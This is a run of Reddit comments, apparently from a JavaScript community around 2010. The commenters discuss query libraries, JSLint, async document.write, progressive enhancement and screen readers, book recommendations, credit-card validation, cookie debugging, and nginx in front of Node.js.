It looks like a lot of effort and thought has gone into this, and it's quite a cool idea from a purely geeky point of view, which is why I hate to say this... but here are my concerns: * this has a "shrinking market"; why go to the bother of learning a new syntax (similar to *but distinct from* SQL) when in a year or two all browsers will have SQLLite? * this may be too slow to use for large data, but for small data simpler data-access methods might be preferable * why would this be preferable to built-in data-access methods?
yeah, inability to be indexed is the killer for sproutcore for me. I've been using XUL lately (for an addon) and wishing there was something like that for the web at large.
Yeah. I've been toying with the idea to create a simple "public" view of the main content that needs to be indexed and a full blown app for users who are logged in. The problem is that you want the level of abstraction that SproutCore provides to make development more effective but at the same time, indexing is still required for the projects which are in gray area between desktop-class applications and regular web apps. :(
SQL is an okay language for querying relational databases -- which in stark contrast to the client-side local memory/storage of, for example, web browsers -- are full blown engines that have built-in indexing facilities to speed up searching and sorting and relational mapping of data from disk and memory. There's no such engine built into any JS interpreter of which I'm currently aware that will predictively index the individual properties of homogeneous objects stored as 'tabular data'. So unless this library builds its own search tables on top of your own data (I haven't checked so it might) then I think a more sane option would be to just go with a few lines of old fashioned sorting and basic iteration. And even then of course if you're relying so much on the very unreliable storage facilities of the client -- so much so that you need a full query language to sift through it -- then maybe the application's design needs to revisit the drawing board. Still I suppose this would be handy for the very very rare occurrences where such a strategy is warranted. So props to the developer. 
I feel pity for any javascript developers that are not aware of jslint. 
I am really keen on Reactive Extensions for Javascript However, all of these introductory examples cater more to my preference as a framework writer.
Really? I'd just be happy that they are now aware of it. We're all newbies at some point.
While publish/subscribe is fantastic for decoupling, using jQuery events to implement it can cause significant overhead: http://weblog.bocoup.com/publishsubscribe-with-jquery-custom-events Also I highly recommend these two presentations of Nicholas Zakas on building large JavaScript applications: * http://video.yahoo.com/watch/568351/2820297 * http://developer.yahoo.com/yui/theater/video.php?v=zakas-architecture 
I'm happy when they know about it too, I feel pity when they don't.
Meh.
Do you know something better? (than SQL)
To me HTML5 can only be a good thing in this respect. Since it's in the browser it allows the browser and therefore the user to have more fine grained control over what's allowed and what isn't.
Also if you use maven you get javascript compression as part of the build process.
You might have some luck with onChange but keydown and other singular keylogging will be a problem when someone pastes content. Probably really has more to do with the content field you plan on using and what options are available cross-browser. Sounds like you are not going to use a input element so keeping a documentFragment might be a good idea and have a recursive settimeout compare current dom with fragment, if changes then grab new dom as changes and minus out old stuff before sending over wire. Will need to come up with way to place it in correct position on other end (maybe some math here). Just my thoughts... I haven't looked at Etherpad... If it does what you want why not just use it instead of recreating the wheel??
If you are a TextMate user there is a [JavaScript Tools TMBundle](http://andrewdupont.net/2006/10/01/javascript-tools-textmate-bundle/) that includes JSLint for quick validation. It validates your .js files on save and displays a tooltip at the mouse if there are any errors or warnings. You can then hit a keycombo to display the results. [Download From GitHub](http://github.com/subtleGradient/javascript-tools.tmbundle)
Integration for other editors (Emacs, vim, etc): http://www.javascriptlint.com/docs/running_from_your_ide.htm
"WellC0m3 T0 Th3 ¦W0rLd 0F Hack3rz" Edit: back online now
Good remark! My original thoughts actually originate from Zaka's talk. However, since I fire about 1 event every minute I think I'm okay with that overhead :)
(Disclaimer: I'm the author) I'm pretty proud of this script. [newsweek.com](http://newsweek.com) just relaunched and they use it to load their ads dynamically after the page has loaded. In other words, the page doesn't block on ads, so it loads a lot faster. That's just one use. Basically anywhere document.write was preventing Ajax from being option, it can be with this script.
Maybe [canvas-text](http://code.google.com/p/canvas-text/) would work as a replacement for iPhone?
That's quite awesome. I'm going to play with it some, see if I can change any code of mine.
Thanks for your response. I don't know why I got downvoted to oblivion. It would be nice to know, but I guess this sub has some anonymous douche-bags who have something personal against me. Whatever.. &gt; if changes then grab new dom as changes and minus out old stuff before sending over wire. Will need to come up with way to place it in correct position on other end (maybe some math here). Yeah, this has already been tackled by the EtherPad guys. They have their own changeset format. But I don't really need anything that sophisticated. If the user were to insert a character into the middle of the content of a DOM element, it would be enough to copy the entire element and send that. Most users won't be writing entire novels inside one paragraph (&lt;p&gt;) tag. &gt; Just my thoughts... I haven't looked at Etherpad... If it does what you want why not just use it instead of recreating the wheel?? The problem is that it doesn't do exactly what I want. I don't need color coding. I don't need two editors editing the same document, just one.. Also, I'm trying to re-brand the functionality. So it behooves me to read the source code and pull out what I want.
I was ready to reply with: document.write = function() { /* do nothing! */ } ...until I understood that this was meant to curb DOM blocking. This is pretty bad ass. :D
I did the same thing. I was clicking to the main source file expecting it to be much ado about one line of code. The "Jesus script" reference is a little overkill and makes no sense, though.
Thanks! That line is there... Among several hundred others to simulate a loading document so that the script can still produce the HTML it needs to. 
It's not so much being careful about using loops in JavaScript, but being careful about redeclaring variables within the same scope. That's what j, k, and l are for.
&gt; The "Jesus script" reference is a little overkill and makes no sense, though. It got your attention right? It's a quote from one of the newsweek.com devs.
Is writeCapture.js basically my [asynchronous `document.write`][1] JavaScript library without the progressive enhancement? Your README is essentially an extremely subjective ad that doesn't tell me a single thing of what writeCapture.js is or does. READMEs are a place for technical documentation, not promotion and advertisements. [1]: http://github.com/eligrey/async-document-write
There are already libraries to make document.write asynchronous, without having to jump through the hoops that writeCapture.js provides.
Dude, what's with the hate? So we both wrote code to do the same thing. I'm sorry?
I don't mean to bash on you or the library. I'm just opposed to the README's explanation of the script, as it's a very subjective ad with little technical description. Sorry if I'm coming off rude.
Even open source projects need advertising. If I don't do it, nobody else will. Ultimately how useful people find it will determine how much publicity it gets, but getting people to try it in the first place is key. If you don't have users, you're not going to find all the bugs and those few who do try it will give up in frustration.
th? I thought you quit the internet.
Dude, why mention hate? He asked a simple question, no need for the passive aggression.
Upboat for effort.
My philosophy is that navigation (eg links/menus) should still work, but beyond that each section of the site is evaluated as to whether the added complexity is worth it or not... usually not.
For public-facing sites, progressive enhancement. In addition to SEO and accessibility, you really never know what type of device might access the site. For internal apps, I require JavaScript.
Very cool - I especially like how you are able to execute the code samples on your slides, that's a nice visualisation.
I have to support non-JS users - it is a business requirement. I absolutely do not agree with accessibility or 508 standards however. The screen readers should be so good as to visually interpret the graphical representation in front of it. Screen readers should understand canvas tags, but they never will in their current incarnation. There will never be an incentive to create one when the government mandates that the rest of the software world bend over backwards to accommodate &lt; 1% of the users with accessibility. We would all be much better off subsidizing awesome screen reader software, or even better, stem cell eye replacement etc. It's a misguided effort. 508 compliance - surfing the web like it's 1996. 
Javascript: The Good Parts seems good but I'm not sure.
I generally recommend "Object-Oriented JavaScript" by Stefanov as a starting point. Too many people jump into using frameworks without having a solid understanding of the core language. Also, these aren't books, but excellent reference sites: * [Mozilla’s Core JavaScript 1.5 Reference](https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference) * [Quirksmode W3C DOM Compatibility – Core](http://www.quirksmode.org/dom/w3c_core.html)
Same here. I support non JS users because I have to. I also don't agree with 508 compliance, even though I *am* one of those disabled users (yes, I'm a legally blind designer). 
I beg to differ. It is not working on the Android browser. Also, the keys required to push are not available on all devices such as iPad, HTC hero, etc... But its still an awesome piece of magic!
Yeah, that one looks good.
Out of curiosity, can I assume that if all content is accessible using keyboard navigation then it will work properly with a screen reader? Also, in your experience have screen readers generally supported JavaScript?
Javascript: The Definitive Guide and Javascript: The Good Parts. 
We released our model-driven webapplication framework called [OpenSAGA](http://opensaga.org) on May 1st. It focuses on translating a declarative model of an application to a working application. One of our features is generally working with and without Javascript. We or in this case mostly I implemented common progressive enhancement techniques optimized by model introspection. One reason for doing this are legal requirements for eGovernment and other software, requiring either following our local BITV standard or WCAG 1.0 and WCAG 2.0. Javascriptlessness is not as much of a big issue as it was, because as you already said modern screen-readers are usually capable of executing javascript. But that doesn't mean it's easy to follow for a visually impaired person. We can easily see changes on the screen which blind people have to rely on their screen reader which is painfully slow, even at the basically unintelligible-to-the-untrained-ear speeds many set it to( See [WAI ARIA](http://www.w3.org/WAI/intro/aria) for an attempt to deal with these issues). 
It's a good and necessary book to own, but if you're looking to work through examples this is not the one. I wonder if anyone has a suggestion for a good javascript workbook. If not, will someone please write one?
I actually don't use a screen reader. I just zoom in a lot, so I'm not that experienced with them, but I did use one for a bit a while back, when recovering from eye surgery and I don't recall noticing any major difficulties getting around with it, but I've never tired it on a heavily javascripted/ajax-intense web app. 
I support non-JS users whenever possible. It may not be an awesome experience, but it will work. I also have developed several things that require JS. If I know that the product I am working on will REQUIRE JS to function, then I do not bother even checking what will happen without it.
I use jQuery all day every day, so I would have to go with [Pro javascript techniques](http://books.google.com/books?id=GgJN2CC_2s4C&amp;dq=pro+javascript+techniques&amp;printsec=frontcover&amp;source=bn&amp;hl=en&amp;ei=qkcITJPON4bGlQfdke3_Dg&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=4&amp;ved=0CDIQ6AEwAw#v=onepage&amp;q&amp;f=false) It is by the guy who started jQuery, and start by going over all the the important details you will not pick up by just reading w3schoos etc. and then basically goes into writing a library like jQuery. It improved my understanding of javascript by an order of magnitude.
For whatever reason, on chromium on Ubuntu 10.04 I can't get the entire slide to be in view, running at 1280x800 something always seems to be cut off, in fact, it looks like it doesn't scale at all, that might be something to address.
[Professional JavaScript for Web Developers](http://www.wrox.com/WileyCDA/WroxTitle/productCd-0764579088.html)
It's not ultra comprehensive but you need to read it.
Are you kidding me? Is this even debatable? "the best, not necessarily the most thorough"? The most thorough is the Rhino book. The best is J:TGP. No questions.
This is my JavaScript evangelist pamphlet, I use it when I go door to door.
Neat enough, but I would prefer using the new HTML5 elements for section/navigation.
Nice job :)
The three books people will recommend constantly are: * Javascript: The Definitive Guide (purely on Crockford's recommendation, most haven't read it) * Javascript: The Good Parts (writted by Crockford) * Pro Javascript (John Resig, creator of JQuery) The book that should get recommended more than it is: * DOM Scripting by Jerermy Keith.
I liked JS:TGP; it seemed like something I'd recommend to my friends who are good programmers but don't appreciate JS as more than a toy language. It didn't do a lot to convince though, just laid stuff out and left the vision up to the reader. Good and bad, if you ask me.
It depends if you're building a web application, or an interactive display. The first, definitely; the second, definitely not.
Any one successfully able to test it ? My client is not receiving any messages.
This combined all the little gotchas I spent years learning into a single page: [A re-introduction to JavaScript](https://developer.mozilla.org/en/A_re-introduction_to_JavaScript)
It got my attention, yes. But that attention is, "WTF is this guy full of himself? What does that even *mean*?" Especially since you used "because" as a conjunction, as if there was some relationship to document.write and Jesus.
I like that their examples are all other sites they have nothing to do with, but if you're a manager you think "Oh wow Google and Twitter and Facebook all use this service, SIGN ME UP!"
I usually don't. Less then 1% of the users who hit my sites have javascript disabled. I usually build my javascript in a way that makes it easy for non-js to read it, but I don't go out of my way to support them.
If you are looking to learn about optimization and performance: [High Performance JavaScript](http://www.amazon.com/gp/product/059680279X?ie=UTF8&amp;tag=nczonline-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=059680279X) (O’Reilly, 2009) by Nicholas C. Zakas contributions by Ross Harmes, Julien Lecomte, Steven Levithan, Stoyan Stefanov, and Matt Sweeney. is a great resource. Also pretty much anything by Zakas.
The [jQuery SWFObject plugin](http://jquery.thewikies.com/swfobject/) is what you seek.
Thank you oh wise one.
Did anyone else read that as "**Bacon** - cloud based WebSocket with Comet fallback"
Really horrible in TraceMonkey, but V8 isn't bad. I use eval() a lot as a way to do precompilation, but SpiderMonkey/TraceMonkey don't seem to optimize it well. Just a subjective analysis -- I'm sure there's much more to it.
I agree with this method, if you combine this using the headers of the ajax call you can still maintain accessibility in your static site by serving one page up for an ajax call, and the more complete one when you reach the page outside of a javascript call.
Is this seriously a question? I haven't seen a device which doesnt support javascript.
It think it may need something more intelligent than a regular expression.
[This may be of some use to you](http://www.regular-expressions.info/creditcard.html) Based on that page you'd want to strip out all non-digits and use ^(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(3[47][0-9]{13})|(6(?:011|5[0-9]{2})[0-9]{12})$
one of them has a different char length, i think it's discover... http://regexlib.com/Search.aspx?k=credit%20card
These might help you: * http://en.wikipedia.org/wiki/Bank_card_number * http://en.wikipedia.org/wiki/List_of_Bank_Identification_Numbers * And this is the way to validate a CC number: http://en.wikipedia.org/wiki/Luhn_algorithm You need a database with the identification numbers anyway. 
Thanks guys I used luhn
I find that it's *rarely* regexes that aren't intelligent enough.
I feel the same, they're more capable than most right-wingers. However, validating credit cards is not a simple feat. It's also nice to calculate card brand (Visa, Mastercard, etc.) based on number. I've seen this in a few places.
The Luhn algorithm is all you need to tell if a number is valid. There are characteristics (length, starting numbers, etc) which will allow you to determine the type of card it is.
&gt;they're more capable than most right-wingers wat.
&gt; [regular expressions are] more capable than most right-wingers Damned pronouns.
readCookie() and writeCookie() are missing. Hard to tell what's the problem. Have you thought about using a library? (jQuery + jQuery.cookie for example?)
Thanks, but what do you mean they're missing? readCookie() is in the greetUser function, and writeCookie() is in the touchRock function. I'm also learning jQuery, but I want to learn vanilla javascript as well so I can have a better grasp of things. 
In your writeCookie function, in the last bit of the arguments (the 5*365) → I'm guessing its meant to set it to expire 5 years ahead. You say it is gone by the time you refresh, maybe thats still in milliseconds and it's expiring almost instantly. Maybe to help as you go install something like the web developer toolbar for firefox and then use its "view cookies" to see what your JS has set according to the browser. The other thing is few people are writing javascript as directly as this these days, instead they're using a library like jQuery or prototype which gives you a much, much nicer "syntax" and set of functions to use to do a lot of this grunt work for you. I don't mean to disuade you from learning the core of the JS language but if you're aim is to add javascript to your pages to do things like you're code is doing I'd use something like jQuery instead and play around with that.
cookies are the devil. If you insist on using them directly, to store little bits of data, get *really* good with Firefox Firebux and the equivalent debugging tools with Google Chrome. I suggest writing your app with jQuery first, then stripping out the libraries if that's what you'd like to do. I also suggest a network tracing application, like Wireshark. Cookies can be *very* finicky and the above tools make it easier to see what's actually happening at each level of software.
Yeah, I'm not planning on using plain Javascript for pages. I just want to learn it in case I ever have a problem with jQuery or need to write a unique script or something. I also want to learn how to program, and eventually learn PHP. I tried changing it to milliseconds, but didn't work. I also found out that you actually have to set the expiration time in days. 
I tried the code out in Firefox and it works. I was using Chrome the whole time. Does anyone know the difference between Chrome and Firefox when it comes to handling cookies? Thanks everyone for the help, I guess the problem was actually Chrome.
Yes, they're called from there, but they're not defined anywhere and not part of the standard browser environment.
I think that' you'd be better off asking such questions on [StackOverflow](http://www.stackoverflow.com)
Thanks I forgot about stackoverflow. I'll go there next time.
If you don't already know how to program, PHP might be a better place to start than javascript. javascript is interpreted by the browser, which can be unreliable. PHP is processed by the server, and is therefor more reliable. 
Yeah I know different browsers interpret javascript differently, which is why jQuery and other frameworks are popular. I just like working with the front end more right now.
Only on sites for older mobile phones. Everyone else can suck it.
Quick Tip: Use JSBeautifier.org to pretty print your JS and satisfy JSLint's strict whitespace check at the same time.
take a look at this http://yehudakatz.com/2009/04/20/evented-programming-with-jquery. It can give you some inspiration about writing your own framework
This really is a debatable subject as I feel that the preference will change from people to people. Here is a list of books that I prefer personally [Professional JavaScript® for Web Developers, 2nd Edition by Nicholas C. Zakas](http://www.amazon.com/Professional-JavaScript-Developers-Wrox-Programmer/dp/047022780X) [Pro JavaScript Techniques by John Resig](http://www.amazon.com/Pro-JavaScript-Techniques-John-Resig/dp/1590597273/ref=sr_1_1?ie=UTF8&amp;s=books&amp;qid=1275916680&amp;sr=1-1) [JavaScript: The Definitive Guide by David Flanagan](http://www.amazon.com/JavaScript-Definitive-Guide-David-Flanagan/dp/0596101996/ref=sr_1_1?ie=UTF8&amp;s=books&amp;qid=1275916750&amp;sr=1-1) [JavaScript: The Good Parts by Douglas Crockford](http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742/ref=pd_sim_b_2) [Pro JavaScript Design Patterns by Dustin Diaz &amp; Ross Harmes](http://www.amazon.com/JavaScript-Design-Patterns-Recipes-Problem-Solution/dp/159059908X/ref=pd_sim_b_10)
Safari 5 draws a number stepper, but is flagged as "Native UI support: False" on your test: http://www.miketaylr.com/code/html5-forms-ui-support.html
Right. It's failing because it doesn't do the sanitization required by spec for bogus values.
And something more maintainable and testable. Good luck trying to wrap your head around that 114-character expression above.
Too bad every common browser supports at least some HTML5 already.
And in other news, you have use a stylus with needle-point precision to manipulate the browser screen on a Nokia N900.
Nope. Mine's fine - best mobile browser I've used. Have you calibrated your screen?
Good stuff, great walkthrough of strict mode.
I think you mean "8 Screenshots of Amazing JavaScript Image Zoom Scripts". If you don't want to put up live demos on your page (which can be very hard or impossible if the scripts conflict), at least give direct links to the scripts' own demo pages.
I'm feeling a little jealous, although given the fps I'm seeing in the video, it might be a while before we see a js port of tf2 running on the n900. 
If you're talking about the problems I was having in the video, don't worry -- it's not that tricky in normal use, only when you're looking at the phone's screen on the camera's screen. It's surprising how much stereoscopic vision helps when tapping a screen with a stylus.
It was built using NodeJS, Redis, and nginx. Took about a month or two to write while I was out traveling around and enjoying not being employed.
At first I was going to comment, "so what does your JSON service do, other than the output being JSON?". Then it dawned.
Is it the wording of the description on the homepage that is not clear?
I like the editor, being able to preview my runtime results. An API reference would be nice, I had to figure out that there was a getElements function for HTML feeds by looking at some other feeds.
So what's your question..?
No, it was just the title here on Reddit :)
There's a link at the top of the editor "Function Reference". I'll have to make that more obvious.
Looks good. As far as I can tell you have two types of users: * people who will create feeds, and will want the documentation on how to create them * people who will use the feeds, and will want instructions on how to use them (probably with jQuery) I think you need a really simple example on the homepage for both these users, with comments to show what it does and how. As it stands it takes a bit of thinking to work out what's going on. Otherwise this is a really good service!
right now I have this: javascript:sr=$(".redditname a").text();if(sr!=='programingchallenges'){alert('not your subreddit!');return;};ci=String(location).indexOf('comments');if(ci&lt;0){alert('You are not on a comments page'); return;};jQuery.get('http://www.reddit.com/r/programingchallenges/about/stylesheet',function (d) {ss=d.match(/name="stylesheet_contents" &gt;(.*?)&lt;\/textarea&gt;/)[1];ss = $('&lt;textarea/&gt;').html(ss).val();c = /([\s\S]*\/\* \[startcompleted\] \*\/)([\s\S]*)(\/\* \[endcompleted\] \*\/[\s\S]*)/;s = /([\s\S]*?\})/g;i = /.id-t3_(.*?)\b/;sc = ss.match(c); the next part of code I need to put in is this part: newcss = ss.replace(c, '$1' + n + '$3'); but looking through the javascript I can't find where n is defined or what it does, I'm kinda teaching myself javascript as I go along here, so it's probably an amateur mistake 
How does one go about deciding to use something like nginx? This kind of thing always puzzles me.
Nginx was very easy to install and configure, is very fast, and takes care of gzip compression for both static files and proxied requests. Why would one not choose nginx? What is you weapon of choice?
Conceptually, this seems to have a lot in common with [YQL](http://developer.yahoo.com/yql/).
Excellent suggestion. I've got two simple examples I can put up and I'm working on a screencast now.
Not that this thread is really about this, but I choose Apache solely because I know how to configure it and set up gzip compression on it, which is something learned with trial and error over the years. How did you learn to use nginx, any good resources?
I use Apache. Seemed like the thing to do if you didn't want to use IIS at the time. (2 years ago..?) I couldn't imagine anything being much easier to install, and I haven't really noticed any need for any higher "performance". I guess the sites I have run haven't ever had serious load. I looked up Nginx and was impressed by the fact that it actually showed up on the Netcraft web server survey. Why did you not choose Lighttpd? I've seen that name thrown about.
Check out slide 9 and 10 of http://nodejs.org/jsconf.pdf Effectively, if you stay on the left side of these graphs, you can make the call that Apache is darn good enough, and since you get a lot more tools and modules to work with it, it's the right choice. The further you go to the right (higher concurrent connections), the least attractive Apache becomes when compared to a fully asynchronous I/O server. 
Why are you using nginx when it seems like NodeJS already provides a scalable async I/O http server baked in? Are you using multiple nodeJS instances per box to fill up your CPU cores with a single nginx per box in front of them?
nginx is very focused on serving content fast and I find the configuration file format less confounding (I've done my share of Apache administration and deployment). Granted, the nginx documentation is not the easiest to understand but a little googling and some experimentation usually gets one results in short order. Another reason I chose nginx is that upgrading can be done [in place](http://wiki.nginx.org/NginxCommandLine#Upgrading_To_a_New_Binary_On_The_Fly) (no downtime) and backend code deployments are also seamless thanks to live reloading of the nginx config (I have multiple node instances running) like so: * comment out half the node instances (bank A) in the nginx config and reload the config * shut down bank A, update the node code, and restart bank A * add bank A back in, comment out bank B, and reload the nginx config * restart bank B * add bank B back into the nginx config and reload the config Takes less than thirty seconds even with high traffic and nary a request is lost. Edit: also nginx has a much lighter footprint than Apache and uses the event driven model (think twisted or, well, node!) vs. the typical web server's thread-per-request approach.
There are multiple node instances behind nginx for two reasons: making use of multiple cores and availability (if an instance dies, nginx can remove it from the pool faster than I can detect the failure and restart using something like monit). I've also been considering using a node supervisor than can monitor health and restart instantly on termination but my TODO list is already quite long. Yes, node can serve HTTP directly but it is still very low level. I use it to serve the dynamic JSON and widgets (nginx simply proxies the HTTP requests to a pool of node HTTP servers) but when it comes to caching static content, handling expiration headers, and checking file modification times (to know when to eject content from the cache), it was easier to just defer to nginx. There are some excellent web serving frameworks for node starting to solidify but they were not where I needed them to be when I started this. Also, there are still some issues surrounding gzip compression (synchronous calls are death in node and I don't want to spawn a subprocess each request) that I'm sure will be ironed in the very near future but I needed it working now. What I'm really excited by is the new [WebWorker support](http://groups.google.com/group/nodejs/browse_thread/thread/50a7828bfa496d45#) that's been shaping up in the past few days. It is going to really open up the possibilities.
Reading (and rereading) the nginx docs, googling (there are a lot of articles out there), and some good 'ole trial and error.
Does that mean that you are now beholden to maintain the service at jsonduit.com? If this becomes popular will you have problems scaling it?
I did it for fun but that doesn't mean I cut any corners. Scalability and stability were key considerations right from the start, it is just so ingrained from my [professional experience](http://tautologistics.com/resume/). If this service did become popular (even just a little) I would regard it as my responsibility to make sure it stayed up and stable. It is my baby, after all.
That and Pipes. The nice thing here is that one does not have to jump through hoops connecting wires to modules or learn YQL or how to create an OpenTable; one only has to know JavaScript.
Nice idea, well executed. I'm impressed!
This is great to have, but please don't use it. Almost every use of crypto in JS is insecure from the get go.
I got this in my mailbox today. I was actually really impressed with their obfuscation method, I couldn't make heads or tails of the code, even after cleaning it up with a beautifier.
I thought this would make a great code sample to show to a student or a candidate during a job interview for a JavaScript role, and ask them what the code does.
How do you react if they say "oh, I wrote that"?
I got this. It passed Gmail's filters for me as well. My question is, doesn't all this subterfuge make recipients think the sender can't be trusted even more than a typical spam message?
"Heck, I'm not even mad; that's amazing."
Take a look at [jLinq](http://www.hugoware.net/Projects/jLinq)
Actually, during the past week I started writing my own SQL-ish object. No chaining, but who needs that anyway.
I find it interesting (as descripted), but I'm also a bit puzzled... is the blog application finished? Seems by now only a declaration of inclusions....
You can see a working example of this script at: http://jsfiddle.net/PnKg4/4/ &lt;script type="text/javascript"&gt; function init(){ var imgElement = document.getElementById("rockImg") ,userName = readCookie("irock_username") ,resizeRock = function() { imgElement.style.height = (document.body.clientHeight - 100)*0.9 } ,resetTimer = null ,resetRock = function() { imgElement.src = 'rock.png' imgElement.setAttribute("alt", "iRock") } ,touchRock = function() { if (userName) { alert("I like the attention, " + userName + ". Thank you.") } else { userName = prompt("What is your name?", "") if (userName) { alert("It is good to meet you, " + userName + ".") writeCookie("irock_username", userName, 5 * 365) } } imgElement.src = "rock_happy.png" imgElement.setAttribute("alt", "rock_happy") if(resetTimer) clearTimeout(resetTimer); resetTimer = setTimeout( resetRock, 5000) } ,greetUser = function() { if (userName) { alert("Hello " + userName + ", I missed you.") } else { alert("Hello, I am pet rock.") } } // Wire up DOM events document.body.onresize = resizeRock imgElement.onclick = touchRock greetUser() } &lt;/script&gt; &lt;/head&gt; &lt;body onload="init();"&gt; &lt;div style="margin-top:100px; text-align:center"&gt; &lt;img id="rockImg" src="rock.png" alt="iRock" style="cursor:pointer" /&gt; &lt;/div&gt; &lt;/body&gt;
This is awesome! I've been looking for a NN written in JS.
It can come in handy in NIWEA type of applications, like PhoneGap. And of course on server side JS.
This is awesome! I have made sites where i needed to scrape other sites to create json feeds. i used perl in those cases, but with this service i can get rid of the perl requirement and use pretty much any web host. I would pay money to use this (probably not a lot, but money)
err what?
If anyone comes up for some novel uses for this, please post!
I'll start off by saying I mistakenly linked JS with the browser. That ruins my argument. So I'll expand. The browser is one of the most insecure platforms in computer science. There are more attack vectors into web apps then almost any other system. So, using an insecure platform for security is moot suggestion from the start. That said, this is AMAZING for the server side.
I don't even understand what you want...
I have web page. Once I navigate to this page, it displays a dialog box for user name and password. I enter these. Then a page displays a few links. I need to click a link. All above I want to automate (no manual work of opening browser, entering authentication, clicking link) using some script. I can call this script from a Windows Batch file. Often I need to do this, so I am trying to automate it.
I don't see where javascript comes in...
Sounds like you need [iMacros](https://addons.mozilla.org/en-US/firefox/addon/3863/) or something similar.
OK, this is not a javascript problem. We can probably help you, but you should understand that if you are automating some of the old school pay-per-click systems then it will have mechanisms in place to detect abuse. Right first thing I would suggest is that you may not have to use the dialog box and browser open, try going to the url: http://username:password@www.thewebsite.com Now, if that works fine, then you should be able to automate the retrieval of that page in a scripting language of your choice. I would recommend something simple like Python. You will want to use a URL fetching library (urllib2) in Python to grab the contents of that webpage mentioned above. Now you will want to process the page and extract the links from it, this is easily done with a regular expression, but I suggest you look into a custom HTML parsing library (such as BeautifulSoup for Python) which will make it very easy to grab the links. Now for each link you will simply want to use the URL fetch library (urllib2) to download the contents. Note that if the login requires cookies, then this is easily done using urllib2, simply google for it. Also if you are required to use a browser, you can either fetch the initial links before calling a shell command to open a browser at the location (i think in windows it is iexplore.exe) Hope you can make something work, or at least are looking in the right direction. If you are sure you want to automate some stuff from within a browser, you may be best looking into some of the firefox plugins which to let you record macros. 
You don't need javascript for this, this is simple HTTP auth
I would use either AutoHotKey, a great little macro/script program for windows, or greasemonkey.
Better. But now you're conflating browsers with web apps, and calling an engineering artifact CS, which doesn't really help your credibility any.
Selenium IDE
Create a webpage that auto submits on load the form with your username and password in it. Then, from the batch file, send the link to that webpage to IE. My example is obtuse. If you need a better description, let me know.
Browsers are insecure. The browser as a platform is a concept in CS. A platform is not an engineering artifact. And I admit my mistakes. So what part of that isn't credible? 
Thanks, I couldn't remember the name of the testing suite, although I guess it may be a bit beyond the scope of what this guy is able to understand :S (no offense OP)
What if you just use jquery to send the updated text, font name, size, position to a php back end that uses GD (imagettftext) to write to a file and send the filename back, and then you update the src of the image attribute with the new filename? Is that realtime enough? I think actually if you want a realtime preview, you might do it clientside with canvas http://code.google.com/p/canvas-text/ https://developer.mozilla.org/en/Canvas_tutorial/Using_images and then send the data or image to the server from the browser, although that would probably be more involved. http://www.nihilogic.dk/labs/canvas2image/
just a div positioned over an image... how difficult could this be?
At some point the image needs to have the text integrated into it obviously so that it can be exported for the tshirt or other object printing.. unless they are sort of doing things manually or the text printing is separate from the tshirt/image printing. if they are printing the text on a shirt with an existing image or the text doesnt need to get integrated into the image then a div over the image would work.
I don't know why you were down voted, using GD is a perfectly reasonable solution. And for true real-time canvas makes sense. 
nice service... which library are you using for the DOM parsing of the XML/HTML documents? Is it already possible to use jQuery for this in node.js? 
Neat.
This kind of technique is used in the apple store for customising the text engraving on ipods.
Absolutely awesome! There is such a big need for this and I'm so happy Microsoft is contributing to jQuery. Finally we might get websites that display stuff in our own localised settings. No more reading dates in whatever the website you're on decides to show them to you as.
you wouldn't create the actual print file in js. You display a "preview" in js (just using the DOM like WWIST said above) and then submit the text and image separately to the server. Then the administrator probably manually photoshops it together. Or you could whip something up in PHP/GD or something.
I'm so proud of Microsoft these days, took them a while too understand that is better to join the open source community than ignoring them or try to fight them. I've never felt like that for Microsoft, I'm glad the new chav in the block is Apple.
Well except for the whole SCO thing, or the recent FUD with threatening people who use Linux. 
I really appriciate Microsoft's desicion to contribute jQuery and expecting good works from them. I think they can carry jQuery to a higher, more enterprise level
Yes, but that's what they've always done, now besides that they actually contribute to some OS projects. Meanwhile Apple just seams to push OS and freedom spirit away. Btw: What was that "threatening people who use Linux"? Must have miss it.
the administrator manually photoshops something together?? read my other comment.
I don't really know what you're saying here. You're suggesting that you could send the text details to the server which would render an image and send it back via json/whatever. That would work. But a simpler way would be to just put a background image on a div and render the text to that as an instant preview for the user. Then when the user is happy, they submit the text details to the server and render it there. Creating the image for print itself in javascript is not the right way to go about this. I suggested the admin manually photoshopping it as a handwavy way to illustrate that the print process might be more involved than a simple snippet of js would be able to handle.
Everyone's proud of microsoft for getting on board with jQuery .. but **it has been called [internationalisation](http://en.wikipedia.org/wiki/Internationalization_and_localization) for 30 years you arseholes don't make up new words that already have [different connotations in the given context](http://en.wikipedia.org/wiki/Global_variable)**. Nobody's commenting on that.
why would anyone want to do that?
From the Wikipedia article you linked: "Some companies, like Microsoft, IBM and Sun Microsystems, use the term 'globalization' for the combination of internationalization and localization." Plus, only morons would confuse "globalization" with "global variables".
i18n is faster ;-)
Ah, but "globalization" is g11n. The double-press of the "1" means it's far more efficient than the laborious "1", "8" combination!
lol they use ie
Sounds like someone wanted something like [genshi](http://genshi.edgewall.org/) but got a bit perverted on the way.
&gt;I'm glad the new chav in the block is Apple. The Chrome development team would like to have a word with you. [ also, can you spot it?](http://googlechromereleases.blogspot.com/2010/06/stable-channel-update.html)
(: better for us users. but Apple have corporate interest in fixing this bugs, and as a sidenote aren't they obligated to give back to webkit community any changes they make? Doesn't lgpl make it mandatory? (TL;DR the license)
More enterprise level?! Have you looked at jQuery site for the companies using it, I guess JQ is already at enterprise level. But indeed a name like Microsoft could help to push it even further. John Resig must be a proud father :)
My original idea was to write (or use an existing) template parser in JavaScript that can render Django/Jinja/etc. templates within the browser straight away. The idea was to use the useful templating-related concepts like blocks, for loops, template inheritance etc. *earlier* in my design process. That is, I don't need to install, set up and use a full-fledge web framework like Django *just* to use its template engine, *just* to design. This is more of a design tool than a real templating solution, I guess I didn't really make that clear :)
Uh, it's not really so much that "they are obligated to do so"(the stuff complying with LGPL was released under the proper license. Additional stuff was released under BSD) but rather they are the ones who forked Webkit from khtml. They are obligated in the sense that it would be silly not to contribute to your own project. My point was that saying "the new chav on the block is Apple" when it comes to open source is silly since it is one of Apple's open source projects that is found in Chrome and in the Android's browser. Grand Central Dispatch, Darwin, and plenty of other projects are also developed or heavily contributed to by Apple and released under some sort of GPL/LGPL, BSD, or Apache license. 
